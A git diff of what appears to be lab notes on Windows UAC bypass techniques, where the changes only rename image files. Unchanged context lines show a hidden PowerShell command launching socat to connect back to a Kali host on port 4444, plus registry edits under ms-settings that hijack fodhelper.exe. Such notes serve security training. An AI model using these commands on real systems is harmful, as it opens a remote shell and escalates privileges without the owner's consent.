@@ -24,7 +24,7 @@ msconfig
 azman.msc
 ```
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (9).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -113,7 +113,7 @@ set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:$KALI:4444 
 reg query %REG_KEY% /v ""
 ```
 
-<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (7) (7).png" alt=""><figcaption></figcaption></figure>
 
 **Kali**
 
@@ -143,7 +143,7 @@ reg add %REG_KEY% /d %CMD% /f & fodhelper.exe
 whoami /groups | find "Label"
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 ### Improving the fodhelper exploit
 
@@ -194,7 +194,7 @@ reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
 fodhelper.exe
 </code></pre>
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## UAC: Environment Variable Expansion
 
